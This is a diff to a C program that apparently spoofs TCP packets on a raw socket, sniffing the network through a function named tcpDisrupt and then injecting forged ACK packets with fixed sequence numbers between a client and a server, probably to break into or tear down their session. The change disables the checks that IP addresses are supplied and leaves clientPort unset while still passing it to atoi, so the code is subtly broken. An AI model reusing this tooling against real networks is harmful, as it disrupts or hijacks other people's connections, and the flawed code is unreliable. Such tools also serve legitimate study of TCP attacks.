@@ -18,8 +18,8 @@ int main(int argc, char **argv) {
     char *clientIP = NULL;
     char *serverIP = NULL;
     char *interface = NULL;
-    int clientPort = 23;
-    int serverPort = 59590;
+    char *clientPort = NULL;
+    char *serverPort = NULL;
     int packet_size = 44;
 
     //Ethernet header + IP header + TCP header + data
@@ -40,7 +40,7 @@ int main(int argc, char **argv) {
                 interface = optarg;
                 break;
             case 'p':
-                clientPort = atoi(optarg);
+                serverPort = optarg;
                 break;     
             case 'h':   /* h or --help */
             case '?':
@@ -52,7 +52,8 @@ int main(int argc, char **argv) {
                 break;
         }
     }
-  
+
+/* For now, these will not need to be mandatory: 
     if(clientIP == NULL) {
         fprintf(stderr, "Client IP address was not provided.\n");
         display_usage(argv[0]);
@@ -64,16 +65,18 @@ int main(int argc, char **argv) {
         display_usage(argv[0]);
         return EXIT_FAILURE;
     }
-
     // TODO: Remove this
     if(interface != NULL) {
         printf("Interface %s\n", interface);
     }
+*/
 
-    printf("Client IP: %s\n", clientIP);
-    printf("Server IP: %s\n", serverIP);
-    printf("Server Port: %d\n", clientPort);
-
+    int result = tcpDisrupt(clientIP, serverIP, serverPort, interface);
+    if (result){
+        fprintf(stderr, "[FAIL] Failed to sniff the network. Quitting.\n");
+        exit(result);
+    }
+ 
     //Raw socket without any protocol-header inside
     if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
         perror("Error while creating socket");
@@ -88,25 +91,18 @@ int main(int argc, char **argv) {
 
     //Populate address struct
     addr_in.sin_family = AF_INET;
-    addr_in.sin_port = htons(serverPort);
+    addr_in.sin_port = htons(atoi(serverPort));
     addr_in.sin_addr.s_addr = inet_addr(serverIP);
 
     //Allocate mem for ip and tcp headers and zero the allocation
     
-
-    int result = tcpDisrupt(clientIP, serverIP, interface);
-    if (result){
-        fprintf(stderr, "[FAIL] Failed to sniff the network. Quitting.\n");
-        exit(result);
-    }
- 
     //Send lots of packets
     int k = 5;
     while(k--) { 
         gen_packet( clientIP,
                     serverIP,
-                    serverPort,
-                    clientPort,
+                    atoi(serverPort),
+                    atoi(clientPort),
                     0, //syn
                     1, //ack
                     4012204404, //seq
